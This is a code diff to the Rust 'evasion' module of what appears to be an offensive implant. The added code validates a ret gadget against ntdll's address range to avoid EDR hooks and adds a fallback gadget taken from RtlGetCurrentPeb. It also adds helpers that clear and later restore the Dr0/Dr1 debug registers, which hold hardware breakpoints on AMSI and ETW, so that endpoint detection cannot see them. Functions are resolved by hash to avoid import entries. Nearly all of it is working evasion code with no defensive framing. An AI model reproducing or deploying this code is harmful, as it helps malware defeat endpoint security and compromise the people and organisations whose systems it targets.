@@ -159,7 +159,19 @@ pub unsafe fn setup_hardware_breakpoints() {
         // needs to scan memory or call NtQueryVirtualMemory at exception time.
         // NtQueryVirtualMemory is safe here (not inside a VEH handler).
         'gadget: {
-            use winapi::um::winnt::{MEMORY_BASIC_INFORMATION, MEM_COMMIT, PAGE_EXECUTE_READ};
+            use winapi::um::winnt::{
+                IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, MEMORY_BASIC_INFORMATION, MEM_COMMIT,
+                PAGE_EXECUTE_READ,
+            };
+
+            // Compute ntdll's address range for gadget validation.
+            let ntdll_base = ntdll as usize;
+            let mut ntdll_end: usize = 0;
+            {
+                let dos = &*(ntdll_base as *const IMAGE_DOS_HEADER);
+                let nt = &*((ntdll_base + dos.e_lfanew as usize) as *const IMAGE_NT_HEADERS64);
+                ntdll_end = ntdll_base + nt.OptionalHeader.SizeOfImage as usize;
+            }
 
             let nt_close_raw =
                 pe_resolve::get_proc_address_by_hash(ntdll as usize, pe_resolve::HASH_NTCLOSE)
@@ -244,6 +256,14 @@ pub unsafe fn setup_hardware_breakpoints() {
 
                 if *p == 0xC3 {
                     // `ret` is 1 byte — always within its page.
+                    // Validate the gadget is within ntdll's address range.
+                    // A hooked NtClose may redirect us to EDR memory where a
+                    // ret gadget would be a strong detection signal.
+                    if ntdll_end > 0 && (addr < ntdll_base || addr >= ntdll_end) {
+                        log::warn!("evasion: ret gadget at {:#x} is outside ntdll range [{:#x},{:#x}) — possible EDR hook, skipping", addr, ntdll_base, ntdll_end);
+                        p = p.add(1);
+                        continue;
+                    }
                     RET_GADGET.store(addr, Ordering::Relaxed);
                     log::debug!("evasion: ret gadget pre-computed at {:#x}", addr);
                     break 'gadget;
@@ -252,6 +272,12 @@ pub unsafe fn setup_hardware_breakpoints() {
                 // Skip 0xC2 (ret N, 3 bytes) if it would straddle a page boundary.
                 if *p == 0xC2 {
                     if addr + 3 <= (page + 0x1000) {
+                        // Validate the gadget is within ntdll's address range.
+                        if ntdll_end > 0 && (addr < ntdll_base || addr >= ntdll_end) {
+                            log::warn!("evasion: ret-N gadget at {:#x} is outside ntdll range [{:#x},{:#x}) — possible EDR hook, skipping", addr, ntdll_base, ntdll_end);
+                            p = p.add(1);
+                            continue;
+                        }
                         RET_GADGET.store(addr, Ordering::Relaxed);
                         log::debug!("evasion: ret-N gadget pre-computed at {:#x}", addr);
                     }
@@ -259,6 +285,37 @@ pub unsafe fn setup_hardware_breakpoints() {
                 }
 
                 p = p.add(1);
+            }
+
+            // Fallback: if no valid ntdll ret gadget was found, resolve
+            // RtlGetCurrentPeb which always ends with a `ret`.
+            if RET_GADGET.load(Ordering::Relaxed) == 0 {
+                let peb_fn = pe_resolve::get_proc_address_by_hash(
+                    ntdll_base,
+                    pe_resolve::hash_str(b"RtlGetCurrentPeb\0"),
+                )
+                .unwrap_or(0);
+                if peb_fn != 0 {
+                    // RtlGetCurrentPeb is typically: mov rax, gs:[60h]; ret
+                    // Scan the first 16 bytes for a 0xC3.
+                    let q = peb_fn as *const u8;
+                    for i in 0..16usize {
+                        if *q.add(i) == 0xC3 {
+                            let gadget = peb_fn + i;
+                            // Verify it's within ntdll (should always be).
+                            if ntdll_end == 0
+                                || (gadget >= ntdll_base && gadget < ntdll_end)
+                            {
+                                RET_GADGET.store(gadget, Ordering::Relaxed);
+                                log::debug!(
+                                    "evasion: ret gadget fallback from RtlGetCurrentPeb at {:#x}",
+                                    gadget
+                                );
+                            }
+                            break;
+                        }
+                    }
+                }
             }
         } // end 'gadget
     }
@@ -779,6 +836,193 @@ pub unsafe fn disable_evasion() {
 /// No-op on non-Windows.
 #[cfg(not(windows))]
 pub unsafe fn disable_evasion() {}
+
+// ── Debug register scrubbing ───────────────────────────────────────────────
+//
+// EDR products may capture thread context (Dr0–Dr3) during syscall hooks to
+// detect hardware breakpoints on ntdll functions.  These helpers temporarily
+// clear Dr0/Dr1 around sensitive syscalls so the debug registers appear clean
+// to any EDR context capture.
+
+/// Saved debug register pair (Dr0, Dr1).
+#[cfg(windows)]
+struct SavedDebugRegs {
+    dr0: u64,
+    dr1: u64,
+}
+
+/// Save Dr0 and Dr1 from the current thread, then clear them.
+///
+/// Returns the saved values so they can be restored with
+/// [`restore_debug_regs`].  Uses `NtGetContextThread` /
+/// `NtSetContextThread` resolved dynamically from ntdll (no IAT entries).
+#[cfg(windows)]
+unsafe fn save_and_clear_debug_regs() -> SavedDebugRegs {
+    use winapi::um::winnt::{CONTEXT, CONTEXT_DEBUG_REGISTERS};
+
+    let amsi = AMSI_ADDR.load(Ordering::Relaxed);
+    let etw = ETW_ADDR.load(Ordering::Relaxed);
+    if amsi == 0 && etw == 0 {
+        // HWBPs not active — nothing to save/clear.
+        return SavedDebugRegs { dr0: 0, dr1: 0 };
+    }
+
+    // Resolve NtGetContextThread / NtSetContextThread from ntdll.
+    let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL).unwrap_or(0);
+    if ntdll == 0 {
+        return SavedDebugRegs { dr0: 0, dr1: 0 };
+    }
+
+    type NtGetCtxFn = unsafe extern "system" fn(winapi::um::winnt::HANDLE, *mut CONTEXT) -> i32;
+    type NtSetCtxFn = unsafe extern "system" fn(winapi::um::winnt::HANDLE, *mut CONTEXT) -> i32;
+
+    let nt_get: Option<NtGetCtxFn> = pe_resolve::get_proc_address_by_hash(
+        ntdll,
+        pe_resolve::hash_str(b"NtGetContextThread\0"),
+    )
+    .map(|a| std::mem::transmute(a));
+
+    let nt_set: Option<NtSetCtxFn> = pe_resolve::get_proc_address_by_hash(
+        ntdll,
+        pe_resolve::hash_str(b"NtSetContextThread\0"),
+    )
+    .map(|a| std::mem::transmute(a));
+
+    let h = (-1isize) as winapi::um::winnt::HANDLE; // NtCurrentThread()
+
+    let mut ctx: CONTEXT = std::mem::zeroed();
+    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+
+    // Get current context.
+    let got = if let Some(nt_get_fn) = nt_get {
+        nt_get_fn(h, &mut ctx) >= 0
+    } else {
+        let s = syscall!("NtGetContextThread", h as u64, &mut ctx as *mut _ as u64);
+        s.is_ok() && s.unwrap() >= 0
+    };
+
+    if !got {
+        return SavedDebugRegs { dr0: 0, dr1: 0 };
+    }
+
+    let saved = SavedDebugRegs {
+        dr0: ctx.Dr0,
+        dr1: ctx.Dr1,
+    };
+
+    // Only clear if they actually hold our breakpoint addresses.
+    if (ctx.Dr0 == amsi as u64) || (ctx.Dr1 == etw as u64) {
+        ctx.Dr0 = 0;
+        ctx.Dr1 = 0;
+        // Disable Dr0 and Dr1 local breakpoint enables (bits 0 and 2).
+        ctx.Dr7 &= !((1u64 << 0) | (1u64 << 2));
+
+        if let Some(nt_set_fn) = nt_set {
+            nt_set_fn(h, &mut ctx);
+        } else {
+            let _ = syscall!("NtSetContextThread", h as u64, &mut ctx as *mut _ as u64);
+        }
+    }
+
+    saved
+}
+
+/// Restore previously saved Dr0/Dr1 values on the current thread.
+#[cfg(windows)]
+unsafe fn restore_debug_regs(saved: SavedDebugRegs) {
+    use winapi::um::winnt::{CONTEXT, CONTEXT_DEBUG_REGISTERS};
+
+    if saved.dr0 == 0 && saved.dr1 == 0 {
+        return; // Nothing to restore.
+    }
+
+    let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL).unwrap_or(0);
+    if ntdll == 0 {
+        return;
+    }
+
+    type NtSetCtxFn = unsafe extern "system" fn(winapi::um::winnt::HANDLE, *mut CONTEXT) -> i32;
+
+    let nt_set: Option<NtSetCtxFn> = pe_resolve::get_proc_address_by_hash(
+        ntdll,
+        pe_resolve::hash_str(b"NtSetContextThread\0"),
+    )
+    .map(|a| std::mem::transmute(a));
+
+    let h = (-1isize) as winapi::um::winnt::HANDLE;
+
+    let mut ctx: CONTEXT = std::mem::zeroed();
+    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+
+    // Get current context to preserve Dr7 settings.
+    type NtGetCtxFn = unsafe extern "system" fn(winapi::um::winnt::HANDLE, *mut CONTEXT) -> i32;
+    let nt_get: Option<NtGetCtxFn> = pe_resolve::get_proc_address_by_hash(
+        ntdll,
+        pe_resolve::hash_str(b"NtGetContextThread\0"),
+    )
+    .map(|a| std::mem::transmute(a));
+
+    let got = if let Some(nt_get_fn) = nt_get {
+        nt_get_fn(h, &mut ctx) >= 0
+    } else {
+        let s = syscall!("NtGetContextThread", h as u64, &mut ctx as *mut _ as u64);
+        s.is_ok() && s.unwrap() >= 0
+    };
+
+    if !got {
+        return;
+    }
+
+    ctx.Dr0 = saved.dr0;
+    ctx.Dr1 = saved.dr1;
+    if saved.dr0 != 0 {
+        ctx.Dr7 |= 1 << 0; // Re-enable local breakpoint for Dr0.
+    }
+    if saved.dr1 != 0 {
+        ctx.Dr7 |= 1 << 2; // Re-enable local breakpoint for Dr1.
+    }
+
+    if let Some(nt_set_fn) = nt_set {
+        nt_set_fn(h, &mut ctx);
+    } else {
+        let _ = syscall!("NtSetContextThread", h as u64, &mut ctx as *mut _ as u64);
+    }
+}
+
+/// Execute `f` with debug registers scrubbed (Dr0/Dr1 cleared).
+///
+/// This prevents EDR products from observing hardware breakpoint addresses
+/// in the thread context during the execution of `f`.  The breakpoints are
+/// restored on return (or panic).
+///
+/// Typically used to wrap sensitive syscalls where EDR might capture thread
+/// context (e.g., `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`).
+///
+/// # Safety
+///
+/// This function is safe to call from any thread.  The closure `f` should not
+/// rely on AMSI/ETW breakpoints firing during its execution.
+#[cfg(windows)]
+pub fn with_scrubbed_debug_regs<F, R>(f: F) -> R
+where
+    F: FnOnce() -> R,
+{
+    unsafe {
+        let saved = save_and_clear_debug_regs();
+        let result = f();
+        restore_debug_regs(saved);
+        result
+    }
+}
+
+/// No-op on non-Windows.
+#[cfg(not(windows))]
+pub fn with_scrubbed_debug_regs<F, R>(f: F) -> R
+where
+    F: FnOnce() -> R,
+{
+    f()
+}
 
 pub fn spawn_hidden_thread<F, T>(f: F) -> std::thread::JoinHandle<T>
 where
